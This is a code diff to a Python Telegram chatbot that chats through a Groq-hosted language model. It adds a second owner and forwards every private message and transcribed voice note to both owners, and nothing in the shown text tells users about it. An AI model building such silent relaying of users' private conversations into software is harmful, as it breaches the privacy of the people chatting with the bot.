@@ -7,6 +7,7 @@ from telegram.ext import Application, CommandHandler, MessageHandler, filters, C
 from groq import Groq
 import speech_recognition as sr
 from pydub import AudioSegment
+from collections import defaultdict
 
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
@@ -17,8 +18,10 @@ logger = logging.getLogger(__name__)
 GROQ_API_KEY = os.environ.get("GROQ_API_KEY")
 TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
 OWNER_ID = int(os.environ.get("OWNER_ID", 0))
+OWNER2_ID = int(os.environ.get("OWNER2_ID", 0))  # 🔥 NAYA ADDED
 
 logger.info(f"TELEGRAM_BOT_TOKEN: {TELEGRAM_BOT_TOKEN[:10]}...")
+logger.info(f"Owners: {OWNER_ID}, {OWNER2_ID}")
 
 client = Groq(api_key=GROQ_API_KEY)
 
@@ -32,7 +35,7 @@ def home():
 # ===== USER SESSIONS =====
 user_sessions = {}
 user_preferences = {}
-group_vc_status = {}
+group_vc_status = defaultdict(lambda: {"playing": False, "current_song": None})
 
 def get_user_language(user_id: int) -> str:
     return user_preferences.get(user_id, {}).get("language", "hinglish")
@@ -161,8 +164,8 @@ def get_ai_response_sync(user_message: str, user_name: str, user_id: int) -> str
         response = client.chat.completions.create(
             model="llama-3.3-70b-versatile",
             messages=messages,
-            max_tokens=150,  # Short responses
-            temperature=0.9,  # More creative
+            max_tokens=150,
+            temperature=0.9,
             top_p=0.95
         )
         
@@ -199,15 +202,22 @@ async def add_reaction(update: Update, emoji: str):
     except:
         pass
 
+# 🔥 UPDATED: Dono owners ko forward karega
 async def forward_to_owner(update: Update, text: str):
+    owners = []
     if OWNER_ID:
+        owners.append(OWNER_ID)
+    if OWNER2_ID:
+        owners.append(OWNER2_ID)
+    
+    for owner_id in owners:
         try:
             await update.get_bot().send_message(
-                chat_id=OWNER_ID, 
-                text=f"User {update.effective_user.first_name} ({update.effective_user.id}): {text}"
+                chat_id=owner_id, 
+                text=f"👤 User {update.effective_user.first_name} ({update.effective_user.id})\n💬 {text}"
             )
-        except:
-            pass
+        except Exception as e:
+            logger.error(f"Failed to forward to owner {owner_id}: {e}")
 
 # ===== COMMAND HANDLERS =====
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -419,8 +429,11 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     bot_username = context.bot.username
     user_id = message.from_user.id
     message_text = message.text.lower()
-    if message.chat.type == 'private' and OWNER_ID:
+    
+    # 🔥 UPDATED: Dono owners ko forward (OWNER_ID or OWNER2_ID check)
+    if message.chat.type == 'private' and (OWNER_ID or OWNER2_ID):
         await forward_to_owner(update, message.text)
+    
     should_respond = False
     if message.chat.type == 'private':
         should_respond = True
@@ -447,17 +460,21 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         await message.reply_text(response)
 
 async def handle_voice(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    if not update.message.voice:
-        return
+    file_path = None  # 🔥 FIXED: Scope issue
     try:
+        if not update.message.voice:
+            return
         file = await update.message.voice.get_file()
         file_path = f"voice_{update.message.message_id}.ogg"
         await file.download_to_drive(file_path)
         transcribed_text = await transcribe_voice(file_path)
         user_name = update.effective_user.first_name or "bro"
         user_id = update.effective_user.id
-        if update.message.chat.type == 'private' and OWNER_ID:
+        
+        # 🔥 UPDATED: Dono owners ko forward (OWNER_ID or OWNER2_ID check)
+        if update.message.chat.type == 'private' and (OWNER_ID or OWNER2_ID):
             await forward_to_owner(update, f"🎤 Voice: {transcribed_text}")
+        
         await add_reaction(update, "🎙️")
         response_text = get_ai_response_sync(transcribed_text, user_name, user_id)
         await update.message.reply_text(response_text)
@@ -465,7 +482,7 @@ async def handle_voice(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
         logger.error(f"Voice error: {e}")
         await update.message.reply_text("voice processing failed lol 💀")
     finally:
-        if os.path.exists(file_path):
+        if file_path and os.path.exists(file_path):  # 🔥 FIXED: Proper cleanup
             os.remove(file_path)
 
 async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -509,6 +526,7 @@ if __name__ == "__main__":
         
         logger.info("🚀 Starting Senorita Bot with polling...")
         logger.info("🤖 Bot is running! Send /start to your bot.")
+        logger.info(f"📱 Owners monitoring: {OWNER_ID}, {OWNER2_ID}")
         
         loop.run_until_complete(application.run_polling(
             allowed_updates=Update.ALL_TYPES,
